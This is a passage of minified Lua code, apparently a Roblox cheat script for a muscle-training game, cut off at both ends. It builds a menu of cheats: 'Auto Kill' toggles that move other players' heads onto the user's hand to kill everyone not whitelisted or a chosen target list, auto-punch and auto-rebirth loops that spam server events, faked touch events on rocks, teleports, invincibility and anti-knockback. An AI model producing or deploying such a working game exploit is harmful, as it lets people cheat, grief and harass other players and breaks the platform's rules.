                                    local a = c - a
                                    local c = a
                                    local e = nil
                                    local f = nil
                                    local g = c
                                    for a = 1, #d do
                                        c = c - d[a]
                                        if c >= 0 then
                                            g = c
                                        else
                                            e = g
                                            f = a
                                            break
                                        end
                                    end
                                    if not e then
                                        e = g
                                        f = #d
                                    end
                                    print("UNIQUE AURA LEVEL NEEDED TO GLITCH:\n")
                                    print("Level: ", f, "    Exp: ", e, "\n")
                                    local function c(a)
                                        if a % 1 >= 0.5 then
                                            return math.ceil(a)
                                        else
                                            return math.floor(a)
                                        end
                                    end
                                    local function d(a, b)
                                        local c = {}
                                        table.sort(
                                            b,
                                            function(a, b)
                                                return a.value > b.value
                                            end
                                        )
                                        local d = 0
                                        for b, e in ipairs(b) do
                                            while d + e.value <= a do
                                                c[b] = (c[b] or 0) + 1
                                                d = d + e.value
                                                if d == a then
                                                    break
                                                end
                                            end
                                            if d == a then
                                                break
                                            end
                                        end
                                        if d == a then
                                            return c
                                        else
                                            return nil
                                        end
                                    end
                                    local b = {
                                        {name = "Muscle King Rock", value = c((b + 20) * 12.5)},
                                        {name = "Inferno Rock", value = c((b + 20) * 1.125)},
                                        {name = "Mystic Rock", value = c((b + 20) * 0.75)},
                                        {name = "Frozen Rock", value = c((b + 20) * 0.375)},
                                        {name = "Golden Rock", value = c((b + 20) * 0.2)},
                                        {name = "Large Rock", value = c((b + 20) * 0.075)},
                                        {name = "Punching Rock", value = c((b + 20) * 0.05)},
                                        {name = "1 exp Treadmill", value = 1},
                                        {name = "2 exp Treadmill", value = 2},
                                        {name = "3 exp Treadmill", value = 3},
                                        {name = "Frost Gym Small Treadmill", value = 4},
                                        {name = "Frost Gym Huge Treadmill", value = 5},
                                        {name = "Eternal Gym Treadmill", value = 6},
                                        {name = "Legends Gym Treadmill", value = 7}
                                    }
                                    local a = a
                                    local a = d(a, b)
                                    if not a then
                                        print("No combination found.")
                                    else
                                        print("COMBINATION FOUND:\n")
                                        print("Step 1: Equip the unique aura with 0 exp that you want to glitch.\n")
                                        print("Step 2:")
                                        for a, c in pairs(a) do
                                            if c > 0 then
                                                print("--- Use " .. b[a].name .. " " .. c .. " time(s)")
                                            end
                                        end
                                        print("\nThen, you're ready to glitch!\n\n")
                                    end
                                else
                                    print("\nIt is impossible to glitch if your rebirths are not a pair number!\n")
                                end
                            end
                        )
                        if not a then
                        end
                    end
                )
                local b = O.newTab("👊 Punching", "ImageIdHere")
                b.newLabel("Killing Section")
                b.newToggle(
                    "Auto Kill",
                    "This kills all except whitelisted players!",
                    false,
                    function(b)
                        if b then
                            f = true
                            for a, a in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                                if a.ClassName == "Tool" and a.Name == "Punch" then
                                    a.Parent = game.Players.LocalPlayer.Character
                                end
                            end
                            coroutine.wrap(
                                function()
                                    while f do
                                        local a = game.Players.LocalPlayer
                                        a.muscleEvent:FireServer("punch", "rightHand")
                                        a.muscleEvent:FireServer("punch", "leftHand")
                                        wait()
                                    end
                                end
                            )()
                            while f do
                                local function b()
                                    wait()
                                    for b, b in pairs(game.Players:GetChildren()) do
                                        if
                                            b.UserId ~= game.Players.LocalPlayer.UserId and not z[b.UserId] and
                                                not table.find(a, b.Name)
                                         then
                                            local a = game.Workspace:FindFirstChild(b.Name)
                                            local b = game.Workspace:FindFirstChild(c.Name)
                                            if a and b then
                                                local b = b:FindFirstChild("LeftHand")
                                                if b then
                                                    local c = a:FindFirstChild("Head")
                                                    if c then
                                                        c.Parent = nil
                                                        wait(0.1)
                                                        c.CFrame = b.CFrame
                                                        c.Parent = a
                                                    end
                                                    local a = a:FindFirstChild("sweatPart")
                                                    if a then
                                                        a.CFrame = b.CFrame
                                                    end
                                                end
                                            end
                                        end
                                    end
                                end
                                coroutine.wrap(b)()
                                wait()
                            end
                        else
                            f = false
                        end
                    end
                )
                b.newToggle(
                    "Auto Kill (Good Karma)",
                    "Kills all players that have evil karma (except whitelisted), so you get good karma!",
                    false,
                    function(b)
                        if b then
                            H = true
                            for a, a in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                                if a.ClassName == "Tool" and a.Name == "Punch" then
                                    a.Parent = game.Players.LocalPlayer.Character
                                end
                            end
                            coroutine.wrap(
                                function()
                                    while H do
                                        local a = game.Players.LocalPlayer
                                        a.muscleEvent:FireServer("punch", "rightHand")
                                        a.muscleEvent:FireServer("punch", "leftHand")
                                        wait()
                                    end
                                end
                            )()
                            while H do
                                local function b()
                                    wait()
                                    for b, b in pairs(game.Players:GetChildren()) do
                                        if
                                            b.UserId ~= game.Players.LocalPlayer.UserId and
                                                b:FindFirstChild("evilKarma").Value >
                                                    b:FindFirstChild("goodKarma").Value and
                                                not z[b.UserId] and
                                                not table.find(a, b.Name)
                                         then
                                            local a = game.Workspace:FindFirstChild(b.Name)
                                            local b = game.Workspace:FindFirstChild(c.Name)
                                            if a and b then
                                                local b = b:FindFirstChild("LeftHand")
                                                if b then
                                                    local c = a:FindFirstChild("Head")
                                                    if c then
                                                        c.Parent = nil
                                                        wait(0.1)
                                                        c.CFrame = b.CFrame
                                                        c.Parent = a
                                                    end
                                                    local a = a:FindFirstChild("sweatPart")
                                                    if a then
                                                        a.CFrame = b.CFrame
                                                    end
                                                end
                                            end
                                        end
                                    end
                                end
                                coroutine.wrap(b)()
                                wait()
                            end
                        else
                            H = false
                        end
                    end
                )
                b.newToggle(
                    "Auto Kill (Evil Karma)",
                    "Kills all players that have good karma (except whitelisted), so you get evil karma!",
                    false,
                    function(b)
                        if b then
                            I = true
                            for a, a in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                                if a.ClassName == "Tool" and a.Name == "Punch" then
                                    a.Parent = game.Players.LocalPlayer.Character
                                end
                            end
                            coroutine.wrap(
                                function()
                                    while I do
                                        local a = game.Players.LocalPlayer
                                        a.muscleEvent:FireServer("punch", "rightHand")
                                        a.muscleEvent:FireServer("punch", "leftHand")
                                        wait()
                                    end
                                end
                            )()
                            while I do
                                local function b()
                                    wait()
                                    for b, b in pairs(game.Players:GetChildren()) do
                                        if
                                            b.UserId ~= game.Players.LocalPlayer.UserId and
                                                b:FindFirstChild("goodKarma").Value >
                                                    b:FindFirstChild("evilKarma").Value and
                                                not z[b.UserId] and
                                                not table.find(a, b.Name)
                                         then
                                            local a = game.Workspace:FindFirstChild(b.Name)
                                            local b = game.Workspace:FindFirstChild(c.Name)
                                            if a and b then
                                                local b = b:FindFirstChild("LeftHand")
                                                if b then
                                                    local c = a:FindFirstChild("Head")
                                                    if c then
                                                        c.Parent = nil
                                                        wait(0.1)
                                                        c.CFrame = b.CFrame
                                                        c.Parent = a
                                                    end
                                                    local a = a:FindFirstChild("sweatPart")
                                                    if a then
                                                        a.CFrame = b.CFrame
                                                    end
                                                end
                                            end
                                        end
                                    end
                                end
                                coroutine.wrap(b)()
                                wait()
                            end
                        else
                            I = false
                        end
                    end
                )
                b.newInput(
                    "Whitelist Player",
                    "Only enter username. (Caps don't matter)",
                    function(a)
                        local a = string.lower(a)
                        for b, b in pairs(game.Players:GetPlayers()) do
                            if string.lower(b.Name) == a then
                                z[b.UserId] = true
                                break
                            end
                        end
                    end
                )
                b.newInput(
                    "Remove from Whitelist",
                    "Only enter username. (Caps don't matter)",
                    function(a)
                        local a = string.lower(a)
                        for b, b in pairs(game.Players:GetPlayers()) do
                            if string.lower(b.Name) == a then
                                z[b.UserId] = nil
                                break
                            end
                        end
                    end
                )
                b.newButton(
                    "Reset Whitelisted",
                    "Clear the whitelist",
                    function()
                        z = {}
                    end
                )
                b.newToggle(
                    "Auto Kill Targets",
                    "This kills all targeted players. Use 'Add Target Players' to add!",
                    false,
                    function(b)
                        if b then
                            D = true
                            for a, a in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                                if a.ClassName == "Tool" and a.Name == "Punch" then
                                    a.Parent = game.Players.LocalPlayer.Character
                                end
                            end
                            coroutine.wrap(
                                function()
                                    while D do
                                        local a = game.Players.LocalPlayer
                                        a.muscleEvent:FireServer("punch", "rightHand")
                                        a.muscleEvent:FireServer("punch", "leftHand")
                                        wait()
                                    end
                                end
                            )()
                            while D do
                                local function b()
                                    wait()
                                    for b, b in pairs(game.Players:GetChildren()) do
                                        if
                                            b.UserId ~= game.Players.LocalPlayer.UserId and A[b.UserId] and
                                                not table.find(a, b.Name)
                                         then
                                            local a = game.Workspace:FindFirstChild(b.Name)
                                            local b = game.Workspace:FindFirstChild(c.Name)
                                            if a and b then
                                                local b = b:FindFirstChild("LeftHand")
                                                if b then
                                                    local c = a:FindFirstChild("Head")
                                                    if c then
                                                        c.Parent = nil
                                                        wait(0.1)
                                                        c.CFrame = b.CFrame
                                                        c.Parent = a
                                                    end
                                                    local a = a:FindFirstChild("sweatPart")
                                                    if a then
                                                        a.CFrame = b.CFrame
                                                    end
                                                end
                                            end
                                        end
                                    end
                                end
                                coroutine.wrap(b)()
                                wait()
                            end
                        else
                            D = false
                        end
                    end
                )
                b.newInput(
                    "Add Target Players",
                    "Only enter username. (Caps don't matter)",
                    function(a)
                        local a = string.lower(a)
                        for b, b in pairs(game.Players:GetPlayers()) do
                            if string.lower(b.Name) == a then
                                A[b.UserId] = true
                                break
                            end
                        end
                    end
                )
                b.newInput(
                    "Remove Target Players",
                    "Only enter username. (Caps don't matter)",
                    function(a)
                        local a = string.lower(a)
                        for b, b in pairs(game.Players:GetPlayers()) do
                            if string.lower(b.Name) == a then
                                A[b.UserId] = nil
                                break
                            end
                        end
                    end
                )
                b.newButton(
                    "Reset Targeted",
                    "Clear the target's list",
                    function()
                        A = {}
                    end
                )
                b.newToggle(
                    "Fast Punch",
                    "Faster punching.",
                    false,
                    function(a)
                        if a then
                            local a = game.Players.LocalPlayer
                            local b = a.Backpack:FindFirstChild("Punch")
                            local a = game.Workspace:FindFirstChild(a.Name)
                            local c
                            if a then
                                c = a:FindFirstChild("Punch")
                            end
                            if b and b:FindFirstChild("attackTime") then
                                b.attackTime.Value = 0
                            elseif c and c:FindFirstChild("attackTime") then
                                c.attackTime.Value = 0
                            end
                        else
                            local a = game.Players.LocalPlayer
                            local b = a.Backpack:FindFirstChild("Punch")
                            local a = game.Workspace:FindFirstChild(a.Name)
                            local c
                            if a then
                                c = a:FindFirstChild("Punch")
                            end
                            if b and b:FindFirstChild("attackTime") then
                                b.attackTime.Value = 0.35
                            elseif c and c:FindFirstChild("attackTime") then
                                c.attackTime.Value = 0.35
                            end
                        end
                    end
                )
                b.newToggle(
                    "Auto Punch (No Animation)",
                    "Punch until toggled off",
                    false,
                    function(a)
                        if a then
                            local a = game.Players.LocalPlayer
                            local b = a.Name
                            local a =
                                a.Backpack:FindFirstChild("Punch") or
                                game.Workspace:FindFirstChild(b):FindFirstChild("Punch")
                            g = true
                            while g do
                                if a then
                                    if a.Parent ~= game.Workspace:FindFirstChild(b) then
                                        a.Parent = game.Workspace:FindFirstChild(b)
                                    end
                                    game.Players.LocalPlayer.muscleEvent:FireServer("punch", "rightHand")
                                    game.Players.LocalPlayer.muscleEvent:FireServer("punch", "leftHand")
                                    wait()
                                else
                                    g = false
                                end
                            end
                        else
                            g = false
                        end
                    end
                )
                b.newToggle(
                    "Auto Punch (With Animation)",
                    "Punches until toggled off",
                    false,
                    function(a)
                        if a then
                            local a = game.Players.LocalPlayer
                            local b = a.Name
                            local a =
                                a.Backpack:FindFirstChild("Punch") or
                                game.Workspace:FindFirstChild(b):FindFirstChild("Punch")
                            h = true
                            while h do
                                if a then
                                    if a.Parent ~= game.Workspace:FindFirstChild(b) then
                                        a.Parent = game.Workspace:FindFirstChild(b)
                                    end
                                    a:Activate()
                                    wait()
                                else
                                    h = false
                                end
                            end
                        else
                            h = false
                        end
                    end
                )
                b.newLabel("Rocks")
                b.newToggle(
                    "Ancient Jungle Rock",
                    "Start punching to hit the rock!",
                    false,
                    function(a)
                        if a then
                            local a = game.Players.LocalPlayer
                            local b = a.Name
                            local a = a.Character or a.CharacterAdded:Wait()
                            local a = a:WaitForChild("LeftHand")
                            local b =
                                game.Workspace.machinesFolder:FindFirstChild("Ancient Jungle Rock"):FindFirstChild(
                                "Rock"
                            )
                            i = true
                            while i do
                                if b and a then
                                    firetouchinterest(a, b, 0)
                                    firetouchinterest(a, b, 1)
                                else
                                end
                                wait()
                            end
                        else
                            i = false
                        end
                    end
                )
                b.newToggle(
                    "Muscle King Rock",
                    "Start punching to hit the rock!",
                    false,
                    function(a)
                        if a then
                            local a = game.Players.LocalPlayer
                            local b = a.Name
                            local a = a.Character or a.CharacterAdded:Wait()
                            local a = a:WaitForChild("LeftHand")
                            local b =
                                game.Workspace.machinesFolder:FindFirstChild("Muscle King Mountain"):FindFirstChild(
                                "Rock"
                            )
                            j = true
                            while j do
                                if b and a then
                                    firetouchinterest(a, b, 0)
                                    firetouchinterest(a, b, 1)
                                else
                                end
                                wait()
                            end
                        else
                            j = false
                        end
                    end
                )
                b.newToggle(
                    "Rock Of Legends",
                    "Start punching to hit the rock!",
                    false,
                    function(a)
                        if a then
                            local a = game.Players.LocalPlayer
                            local b = a.Name
                            local a = a.Character or a.CharacterAdded:Wait()
                            local a = a:WaitForChild("LeftHand")
                            local b =
                                game.Workspace.machinesFolder:FindFirstChild("Rock Of Legends"):FindFirstChild("Rock")
                            k = true
                            while k do
                                if b and a then
                                    firetouchinterest(a, b, 0)
                                    firetouchinterest(a, b, 1)
                                else
                                end
                                wait()
                            end
                        else
                            k = false
                        end
                    end
                )
                b.newToggle(
                    "Inferno Rock",
                    "Start punching to hit the rock!",
                    false,
                    function(a)
                        if a then
                            local a = game.Players.LocalPlayer
                            local b = a.Name
                            local a = a.Character or a.CharacterAdded:Wait()
                            local a = a:WaitForChild("LeftHand")
                            local b =
                                game.Workspace.machinesFolder:FindFirstChild("Inferno Rock"):FindFirstChild("Rock")
                            l = true
                            while l do
                                if b and a then
                                    firetouchinterest(a, b, 0)
                                    firetouchinterest(a, b, 1)
                                else
                                end
                                wait()
                            end
                        else
                            l = false
                        end
                    end
                )
                b.newToggle(
                    "Mystic Rock",
                    "Start punching to hit the rock!",
                    false,
                    function(a)
                        if a then
                            local a = game.Players.LocalPlayer
                            local b = a.Name
                            local a = a.Character or a.CharacterAdded:Wait()
                            local a = a:WaitForChild("LeftHand")
                            for a, a in pairs(game.workspace.machinesFolder:GetDescendants()) do
                                if
                                    a.Name == "Rock" and
                                        a.CFrame ==
                                            CFrame.new(
                                                2186.14111,
                                                -0.359961987,
                                                1250.59802,
                                                0.996191859,
                                                -0,
                                                -0.0871884301,
                                                0,
                                                1,
                                                -0,
                                                0.0871884301,
                                                0,
                                                0.996191859
                                            )
                                 then
                                    if a.Parent then
                                        a.Parent.Name = "Mystic Rock"
                                    else
                                    end
                                end
                            end
                            local b = game.workspace.machinesFolder:FindFirstChild("Mystic Rock").Rock
                            m = true
                            while m do
                                if b and a then
                                    firetouchinterest(a, b, 0)
                                    firetouchinterest(a, b, 1)
                                else
                                end
                                wait()
                            end
                        else
                            m = false
                        end
                    end
                )
                b.newToggle(
                    "Frozen Rock",
                    "Start punching to hit the rock!",
                    false,
                    function(a)
                        if a then
                            local a = game.Players.LocalPlayer
                            local b = a.Name
                            local a = a.Character or a.CharacterAdded:Wait()
                            local a = a:WaitForChild("LeftHand")
                            local b = game.Workspace.machinesFolder:FindFirstChild("Frozen Rock"):FindFirstChild("Rock")
                            n = true
                            while n do
                                if b and a then
                                    firetouchinterest(a, b, 0)
                                    firetouchinterest(a, b, 1)
                                else
                                end
                                wait()
                            end
                        else
                            n = false
                        end
                    end
                )
                b.newToggle(
                    "Golden Rock",
                    "Start punching to hit the rock!",
                    false,
                    function(a)
                        if a then
                            local a = game.Players.LocalPlayer
                            local b = a.Name
                            local a = a.Character or a.CharacterAdded:Wait()
                            local a = a:WaitForChild("LeftHand")
                            for a, a in pairs(game.workspace.machinesFolder:GetDescendants()) do
                                if
                                    a.Name == "Rock" and
                                        a.CFrame ==
                                            CFrame.new(311.039825, -2.8099637, -594.010559, -1, 0, 0, 0, 1, 0, 0, 0, -1)
                                 then
                                    if a.Parent then
                                        a.Parent.Name = "Golden Rock"
                                    else
                                    end
                                end
                            end
                            local b = game.workspace.machinesFolder:FindFirstChild("Golden Rock").Rock
                            o = true
                            while o do
                                if b and a then
                                    firetouchinterest(a, b, 0)
                                    firetouchinterest(a, b, 1)
                                else
                                end
                                wait()
                            end
                        else
                            o = false
                        end
                    end
                )
                b.newToggle(
                    "Large Rock",
                    "Start punching to hit the rock!",
                    false,
                    function(a)
                        if a then
                            local a = game.Players.LocalPlayer
                            local b = a.Name
                            local a = a.Character or a.CharacterAdded:Wait()
                            local a = a:WaitForChild("LeftHand")
                            for a, a in pairs(game.workspace.machinesFolder:GetDescendants()) do
                                if
                                    a.Name == "Rock" and
                                        a.CFrame ==
                                            CFrame.new(
                                                166.639954,
                                                0.540015221,
                                                -152.410172,
                                                -1,
                                                0,
                                                0,
                                                0,
                                                1,
                                                0,
                                                0,
                                                0,
                                                -1
                                            )
                                 then
                                    if a.Parent then
                                        a.Parent.Name = "Large Rock"
                                    else
                                    end
                                end
                            end
                            local b = game.workspace.machinesFolder:FindFirstChild("Large Rock").Rock
                            p = true
                            while p do
                                if b and a then
                                    firetouchinterest(a, b, 0)
                                    firetouchinterest(a, b, 1)
                                else
                                end
                                wait()
                            end
                        else
                            p = false
                        end
                    end
                )
                b.newToggle(
                    "Punching Rock",
                    "Start punching to hit the rock!",
                    false,
                    function(a)
                        if a then
                            local a = game.Players.LocalPlayer
                            local b = a.Name
                            local a = a.Character or a.CharacterAdded:Wait()
                            local a = a:WaitForChild("LeftHand")
                            for a, a in pairs(game.workspace.machinesFolder:GetDescendants()) do
                                if
                                    a.Name == "Rock" and
                                        a.CFrame ==
                                            CFrame.new(
                                                -151.459747,
                                                0.540015221,
                                                422.589905,
                                                -1,
                                                0,
                                                0,
                                                0,
                                                1,
                                                0,
                                                0,
                                                0,
                                                -1
                                            )
                                 then
                                    if a.Parent then
                                        a.Parent.Name = "Punching Rock"
                                    else
                                    end
                                end
                            end
                            local b = game.workspace.machinesFolder:FindFirstChild("Punching Rock").Rock
                            q = true
                            while q do
                                if b and a then
                                    firetouchinterest(a, b, 0)
                                    firetouchinterest(a, b, 1)
                                else
                                end
                                wait()
                            end
                        else
                            q = false
                        end
                    end
                )
                b.newToggle(
                    "Tiny Rock",
                    "Start punching to hit the rock!",
                    false,
                    function(a)
                        if a then
                            local a = game.Players.LocalPlayer
                            local b = a.Name
                            local a = a.Character or a.CharacterAdded:Wait()
                            local a = a:WaitForChild("LeftHand")
                            local b = game.Workspace.machinesFolder:FindFirstChild("Tiny Rock"):FindFirstChild("Rock")
                            r = true
                            while r do
                                if b and a then
                                    firetouchinterest(a, b, 0)
                                    firetouchinterest(a, b, 1)
                                else
                                end
                                wait()
                            end
                        else
                            r = false
                        end
                    end
                )
                local a = O.newTab("🚀 Areas", "ImageIdHere")
                a.newButton(
                    "Safe Place",
                    "Teleport to area",
                    function()
                        local function a()
                            local a = Instance.new("Part")
                            a.Size = Vector3.new(500, 5, 500)
                            a.Position = Vector3.new(1000000, 5000, 1000000)
                            a.Anchored = true
                            a.Name = "SafeFloor"
                            a.Parent = game.Workspace
                        end
                        local function b(a)
                            local a = a.Character
                            if a then
                                local a = a:FindFirstChild("HumanoidRootPart")
                                if a then
                                    a.CFrame = CFrame.new(Vector3.new(1000000, 5005, 1000000))
                                end
                            end
                        end
                        if not B then
                            B = true
                            a()
                        end
                        local a = game.Players.LocalPlayer
                        b(a)
                    end
                )
                a.newButton(
                    "Beach",
                    "Teleport to area",
                    function()
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-11, 5, -178)
                    end
                )
                a.newButton(
                    "Jungle Gym",
                    "Teleport to area",
                    function()
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-8686, 7, 2392)
                    end
                )
                a.newButton(
                    "Muscle King Island",
                    "Teleport to area",
                    function()
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-8626, 15, -5730)
                    end
                )
                a.newButton(
                    "Legends Gym",
                    "Teleport to area",
                    function()
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(4603, 989, -3898)
                    end
                )
                a.newButton(
                    "Mythical Gym",
                    "Teleport to area",
                    function()
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2251, 5, 1073)
                    end
                )
                a.newButton(
                    "Eternal Gym",
                    "Teleport to area",
                    function()
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-6759, 5, -1285)
                    end
                )
                a.newButton(
                    "Frost Gym",
                    "Teleport to area",
                    function()
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2623, 5, -409)
                    end
                )
                a.newButton(
                    "Tiny Island",
                    "Teleport to area",
                    function()
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-38, 5, 1884)
                    end
                )
                local a = O.newTab("💪 Grinding", "ImageIdHere")
                a.newInput(
                    "Enter Rebirth Stop",
                    "Enter where you want your auto-rebirth to stop. If not entered, auto-rebirth will run indefinitely.",
                    function(a)
                        local a = tonumber(a)
                        if a and a == math.floor(a) then
                            s = a
                        else
                        end
                    end
                )
                a.newToggle(
                    "Auto Rebirth",
                    "Starts rebirthing.",
                    false,
                    function(a)
                        if a then
                            random = true
                            if s then
                                while random do
                                    local a = game.Players.LocalPlayer.leaderstats.Rebirths.Value
                                    if a < s then
                                        game:GetService("ReplicatedStorage").rEvents.rebirthRemote:InvokeServer(
                                            "rebirthRequest"
                                        )
                                    elseif a >= s then
                                        random = false
                                        break
                                    end
                                    wait()
                                end
                            else
                                while random do
                                    game:GetService("ReplicatedStorage").rEvents.rebirthRemote:InvokeServer(
                                        "rebirthRequest"
                                    )
                                    wait()
                                end
                            end
                        else
                            random = false
                        end
                    end
                )
                a.newButton(
                    "Disable Rebirth Button",
                    "Removes confirm rebirth button",
                    function()
                        game.Players.LocalPlayer.PlayerGui.gameGui.rebirthMenu.confirmButton.Visible = false
                    end
                )
                a.newToggle(
                    "Auto King Rock + Auto Pushups",
                    "Grind durability and strength at the same time. This might not support your device!",
                    false,
                    function(a)
                        if a then
                            F = true
                            local function a()
                                while F do
                                    local a = game.Players.LocalPlayer
                                    local b = a.Name
                                    local c =
                                        a.Backpack:FindFirstChild("Punch") or
                                        game.Workspace:FindFirstChild(b):FindFirstChild("Punch")
                                    local a =
                                        a.Backpack:FindFirstChild("Pushups") or
                                        game.Workspace:FindFirstChild(b):FindFirstChild("Pushups")
                                    if a then
                                        if a.Parent ~= game.Workspace:FindFirstChild(b) then
                                            a.Parent = game.Workspace:FindFirstChild(b)
                                        end
                                    end
                                    if c then
                                        if c.Parent ~= game.Workspace:FindFirstChild(b) then
                                            c.Parent = game.Workspace:FindFirstChild(b)
                                        end
                                        game.Players.LocalPlayer.muscleEvent:FireServer("punch", "rightHand")
                                        game.Players.LocalPlayer.muscleEvent:FireServer("punch", "leftHand")
                                    end
                                    wait()
                                end
                            end
                            local function b()
                                local a = game.Players.LocalPlayer
                                local b = a.Name
                                local a = a.Character or a.CharacterAdded:Wait()
                                local a = a:WaitForChild("LeftHand")
                                local b =
                                    game.Workspace.machinesFolder:FindFirstChild("Muscle King Mountain"):FindFirstChild(
                                    "Rock"
                                )
                                while F do
                                    if b and a then
                                        firetouchinterest(a, b, 0)
                                        firetouchinterest(a, b, 1)
                                    else
                                    end
                                    wait()
                                end
                            end
                            local function c()
                                while F do
                                    game:GetService("Players").LocalPlayer.muscleEvent:FireServer("rep")
                                    wait()
                                end
                            end
                            local a = coroutine.create(a)
                            local b = coroutine.create(b)
                            local c = coroutine.create(c)
                            coroutine.resume(a)
                            coroutine.resume(b)
                            coroutine.resume(c)
                        else
                            F = false
                        end
                    end
                )
                a.newToggle(
                    "Auto Workout / Rep",
                    "Technically an auto clicker for workouts.",
                    false,
                    function(a)
                        if a then
                            t = true
                            while t do
                                game:GetService("Players").LocalPlayer.muscleEvent:FireServer("rep")
                                wait()
                            end
                        else
                            t = false
                        end
                    end
                )
                a.newLabel("Muscle King Gym")
                a.newButton(
                    "King Boulder",
                    "Go to machine to grind.",
                    function()
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                            game.Workspace.machinesFolder:FindFirstChild("King Boulder").interactSeat.CFrame
                        wait(0.3)
                        local a, b =
                            pcall(
                            function()
                                keypress(Enum.KeyCode.E)
                            end
                        )
                        if not a then
                        end
                    end
                )
                a.newButton(
                    "Muscle King Bench",
                    "Go to machine to grind.",
                    function()
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                            game.Workspace.machinesFolder:FindFirstChild("Muscle King Bench").interactSeat.CFrame
                        wait(0.3)
                        local a, b =
                            pcall(
                            function()
                                keypress(Enum.KeyCode.E)
                            end
                        )
                        if not a then
                        end
                    end
                )
                a.newButton(
                    "Muscle King Squat",
                    "Go to machine to grind.",
                    function()
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                            game.Workspace.machinesFolder:FindFirstChild("Muscle King Squat").interactSeat.CFrame
                        wait(0.3)
                        local a, b =
                            pcall(
                            function()
                                keypress(Enum.KeyCode.E)
                            end
                        )
                        if not a then
                        end
                    end
                )
                a.newButton(
                    "Muscle King Lift",
                    "Go to machine to grind.",
                    function()
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                            game.Workspace.machinesFolder:FindFirstChild("Muscle King Lift").interactSeat.CFrame
                        wait(0.3)
                        local a, b =
                            pcall(
                            function()
                                keypress(Enum.KeyCode.E)
                            end
                        )
                        if not a then
                        end
                    end
                )
                local a = O.newTab("🎁 Extras", "ImageIdHere")
                a.newButton(
                    "Infinite Jump",
                    "Hold jump button (or spam it) for infinite jumping!",
                    function()
                        local a = true
                        game:GetService("UserInputService").JumpRequest:connect(
                            function()
                                if a then
                                    game:GetService "Players".LocalPlayer.Character:FindFirstChildOfClass "Humanoid":ChangeState(
                                        "Jumping"
                                    )
                                end
                            end
                        )
                    end
                )
                a.newToggle(
                    "Walk On Water",
                    "You can't fall off the map now.",
                    false,
                    function(a)
                        if a then
                            if u == false then
                                u = true
                            else
                                local a = 20
                                local b = Vector3.new(2048, 5, 2048)
                                local c = CFrame.new(-52.4927979, -10.9850912, -653.540039)
                                u = true
                                local function d(a)
                                    local c = Instance.new("Part")
                                    c.Size = b
                                    c.Anchored = true
                                    c.CFrame = a
                                    c.Transparency = 1
                                    c.CanCollide = u
                                    c.Parent = workspace
                                    game:GetService("RunService").Heartbeat:Connect(
                                        function()
                                            c.CanCollide = u
                                        end
                                    )
                                end
                                d(c)
                                for e = -a, a do
                                    for a = -a, a do
                                        if not (e == 0 and a == 0) then
                                            local a = c + Vector3.new(e * b.X, 0, a * b.Z)
                                            d(a)
                                        end
                                    end
                                end
                            end
                        else
                            u = false
                        end
                    end
                )
                a.newToggle(
                    "Invincible",
                    "Wait until brawl for this to activate. Reset your character for de-activation.",
                    false,
                    function(a)
                        if a then
                            v = true
                            w = true
                            local function a()
                                while v do
                                    game.ReplicatedStorage.rEvents.brawlEvent:FireServer("joinBrawl")
                                    wait(0.05)
                                end
                            end
                            local function b()
                                local a = game.Players.LocalPlayer
                                local a = a.Character:WaitForChild("HumanoidRootPart")
                                local b = a.Position
                                game:GetService("RunService").Stepped:Connect(
                                    function()
                                        if not w then
                                            return
                                        end
                                        local c = a.Position
                                        for d, d in pairs(workspace:GetDescendants()) do
                                            if d:IsA("BasePart") and d.Name == "teleportPart" then
                                                if (c - d.Position).magnitude < 10 then
                                                    a.CFrame = CFrame.new(b)
                                                    return
                                                end
                                            end
                                        end
                                        b = c
                                    end
                                )
                            end
                            local a = coroutine.create(a)
                            local b = coroutine.create(b)
                            coroutine.resume(a)
                            coroutine.resume(b)
                        else
                            v = false
                            w = false
                            local a = game:GetService("Players")
                            local a = a.LocalPlayer
                            if a then
                                local function b()
                                    if a.Character then
                                        a.Character:BreakJoints()
                                    end
                                    wait(1)
                                end
                                b()
                            end
                        end
                    end
                )
                a.newToggle(
                    "Anti-KnockBack",
                    "Blocks your character from moving when being hit.",
                    false,
                    function(a)
                        if a then
                            local a = game.Players.LocalPlayer.Name
                            local a = game.Workspace:FindFirstChild(a):FindFirstChild("HumanoidRootPart")
                            local b = Instance.new("BodyVelocity")
                            b.MaxForce = Vector3.new(100000, 0, 100000)
                            b.Velocity = Vector3.new(0, 0, 0)
                            b.P = 1250
                            b.Parent = a
                        else
                            local a = game.Players.LocalPlayer.Name
                            local a = game.Workspace:FindFirstChild(a):FindFirstChild("HumanoidRootPart")
                            local a = a:FindFirstChild("BodyVelocity")
                            if a and a.MaxForce == Vector3.new(100000, 0, 100000) then
                                a:Destroy()
                            end
                        end
                    end
                )
                a.newButton(
                    "Shiftlock (Permanent)",
                    "When executed, cannot be reversed.",
                    function()
                        if not E then
                            E = true
                            local a = Instance.new("ScreenGui")
                            local b = Instance.new("ImageButton")
                            local c = Instance.new("ImageLabel")
                            local d = game:GetService("CoreGui")
                            local e = game:GetService("Players")
                            local f = game:GetService("RunService")
                            local g = game:GetService("ContextActionService")
                            local e = e.LocalPlayer
                            local h = game:GetService("UserInputService")
                            local h = {
                                Off = "rbxasset://textures/ui/mouseLock_off@2x.png",
                                On = "rbxasset://textures/ui/mouseLock_on@2x.png",
                                Lock = "rbxasset://textures/MouseLockedCursor.png",
                                Lock2 = "rbxasset://SystemCursors/Cross"
                            }
                            local i = 900000
                            local j = CFrame.new(1.7, 0, 0)
                            local k = CFrame.new(-1.7, 0, 0)
                            local l
                            a.Name = "Shiftlock (CoreGui)"
                            a.Parent = d
